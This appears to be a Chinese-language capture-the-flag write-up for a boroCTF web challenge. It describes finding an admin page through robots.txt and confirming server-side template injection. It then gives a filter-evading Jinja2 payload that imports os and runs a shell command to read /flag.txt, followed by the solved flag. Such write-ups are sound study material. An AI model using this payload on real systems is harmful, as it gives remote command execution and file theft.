# NERV

## 題目描述

NERV HQ internal systems remain online following the Third Impact preliminary event.

You have been assigned clearance level 2. This is sufficient.

Do not look for what you have not been given access to. The [REDACTED] does not require your curiosity. It requires your compliance.

Credentials have been issued. ikari : eva01

The Committee is watching. — Commander Ikari

https://xqpmkotuq78s.boroctf.com/

## 解題思路

去 /robots.txt 可以看到 `/admin/reports`，進去以後看到可以輸入 query，於是輸入了 {{7*7}}，結果得到 49，於是知道這題是 ssti

之後用我之前打 picoCTF 弄好的 payload `{{ self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('\x5f\x5fbuiltins\x5f\x5f')|attr('get')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /flag.txt')|attr('read')()}}` 即可得到 flag

## Flag

```text
boroCTF{c0ngr@tulat!0nS*}
```
